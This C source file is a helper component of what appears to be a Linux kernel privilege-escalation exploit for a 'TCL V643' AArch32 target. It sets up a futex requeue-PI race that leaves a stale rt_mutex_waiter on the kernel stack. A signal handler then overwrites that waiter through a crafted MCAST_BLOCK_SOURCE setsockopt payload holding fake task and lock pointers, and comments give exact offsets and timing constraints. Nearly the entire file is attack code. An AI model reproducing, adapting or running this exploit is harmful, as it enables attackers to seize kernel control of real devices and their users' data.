#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "tcl_v643/mcast_carrier.h"
#include "tcl_v643/mcast_helper_protocol.h"

static uint64_t get64(const uint8_t *p) {
  uint64_t value;
  memcpy(&value, p, sizeof(value));
  return value;
}

#ifndef MCAST_BLOCK_SOURCE
#define MCAST_BLOCK_SOURCE 43
#endif

static struct tcl_v643_mcast_shared *shared;
static int mcast_fd = -1;

static long futex_call(uint32_t *uaddr, int op, uint32_t val,
                       const void *arg4, uint32_t *uaddr2, uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, arg4, uaddr2, val3);
}

static void helper_fail(void) {
  atomic_fetch_add_explicit(&shared->failures, 1, memory_order_relaxed);
}

/* tgkill is directed at the waiter TID, so this handler runs on the same
 * kernel stack that contains the stale rt_mutex_waiter.  setsockopt enters
 * the exact V643 AArch32 compat MCAST path and rewrites the complete waiter
 * at +0x80.  Do not add syscalls between setsockopt and round_go. */
static void sigusr1_handler(int sig) {
  (void)sig;
  if (!atomic_load_explicit(&shared->bug_armed, memory_order_acquire))
    return;

  struct tcl_v643_mcast_carrier carrier;
  tcl_v643_build_mcast_carrier(
      &carrier, shared->message.fake_task, shared->message.fake_lock,
      shared->message.wake_state, shared->message.prio);
  (void)syscall(SYS_setsockopt, mcast_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                carrier.bytes, sizeof(carrier.bytes));
  atomic_store_explicit(&shared->round_go, 1, memory_order_release);
  while (!atomic_load_explicit(&shared->round_done, memory_order_acquire))
    atomic_signal_fence(memory_order_seq_cst);
  atomic_store_explicit(&shared->handler_done, 1, memory_order_release);
}

static void *waiter_main(void *unused) {
  (void)unused;
  struct timespec deadline;
  uint32_t dummy_pi;

  atomic_store(&shared->helper_tid, (uint32_t)syscall(SYS_gettid));
  atomic_store(&shared->helper_uid, (uint32_t)getuid());
  atomic_store(&shared->helper_ready, 1);

  if (futex_call(&shared->f_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    helper_fail();
    return NULL;
  }
  atomic_store(&shared->waiter_ready, 1);
  while (!atomic_load(&shared->owner_started)) sched_yield();

  clock_gettime(CLOCK_MONOTONIC, &deadline);
  deadline.tv_sec += 1;
  atomic_store(&shared->waiter_waiting, 1);
  (void)futex_call(&shared->f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &deadline,
                   &shared->f_target, 0);

  /* Force the restarted waiter through a bounded ETIMEDOUT cleanup.  The
   * process leader stays alive in pthread_join, so it is a valid apparent
   * PI owner distinct from this waiter TID. */
  dummy_pi = FUTEX_WAITERS | (uint32_t)getpid();
  {
    struct timespec expired = {0, 0};
    errno = 0;
    long ret = futex_call(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
    if (ret != -1 || errno != ETIMEDOUT)
      helper_fail();
    else
      atomic_store(&shared->cleanup_done, 1);
  }

  if (futex_call(&shared->f_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0)
    helper_fail();
  return NULL;
}

static int run_helper(int fd) {
  struct sigaction sa;
  pthread_t waiter;

  shared = mmap(NULL, sizeof(*shared), PROT_READ | PROT_WRITE,
                MAP_SHARED, fd, 0);
  if (shared == MAP_FAILED ||
      shared->message.magic != TCL_V643_MCAST_HELPER_MAGIC ||
      shared->message.version != TCL_V643_MCAST_HELPER_VERSION ||
      shared->message.size != sizeof(shared->message) ||
      sizeof(void *) != 4)
    return 1;

  mcast_fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
  if (mcast_fd < 0) return 1;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr1_handler;
  sigemptyset(&sa.sa_mask);
  sigaddset(&sa.sa_mask, SIGUSR1);
  sa.sa_flags = SA_RESTART;
  if (sigaction(SIGUSR1, &sa, NULL) != 0) return 1;
  if (pthread_create(&waiter, NULL, waiter_main, NULL) != 0) return 1;
  pthread_join(waiter, NULL);
  return atomic_load(&shared->failures) ? 1 : 0;
}

static int selftest(void) {
  const uint64_t task = UINT64_C(0xffffff8001234480);
  const uint64_t lock = UINT64_C(0xffffff8001234100);
  const unsigned base = TCL_V643_MCAST_COMPAT_WAITER_OFF;
  struct tcl_v643_mcast_carrier carrier;
  struct tcl_v643_mcast_helper_message message = {
      .magic = TCL_V643_MCAST_HELPER_MAGIC,
      .version = TCL_V643_MCAST_HELPER_VERSION,
      .size = sizeof(message),
      .fake_task = task,
      .fake_lock = lock,
      .wake_state = 3,
      .prio = 1,
  };

  if (sizeof(void *) != 4) {
    fprintf(stderr, "FAIL: helper is not an AArch32/ILP32 executable\n");
    return 1;
  }
  tcl_v643_build_mcast_carrier(&carrier, message.fake_task,
                               message.fake_lock, message.wake_state,
                               message.prio);
  if (message.magic != TCL_V643_MCAST_HELPER_MAGIC ||
      message.version != 1 || message.size != 40 ||
      sizeof(carrier.bytes) != TCL_V643_MCAST_COMPAT_COPY_SIZE ||
      get64(carrier.bytes + base + TCL_V643_WAITER_TASK) != task ||
      get64(carrier.bytes + base + TCL_V643_WAITER_LOCK) != lock) {
    fprintf(stderr, "FAIL: helper protocol/carrier invariant\n");
    return 1;
  }

  puts("PASS: AArch32 TCL V643 MCAST helper ABI and +0x80 carrier layout");
  puts("SAFE: self-test only; no futex, setsockopt, reclaim or kernel address used");
  return 0;
}

int main(int argc, char **argv) {
  if (argc == 2 && strcmp(argv[1], "--selftest") == 0)
    return selftest();

  if (argc == 3 && strcmp(argv[1], "--run-fd") == 0) {
    char *end = NULL;
    long fd = strtol(argv[2], &end, 10);
    if (!end || *end || fd < 0 || fd > 1024) return 2;
    return run_helper((int)fd);
  }

  fprintf(stderr,
          "usage: %s --selftest | --run-fd FD\n", argv[0]);
  return 2;
}
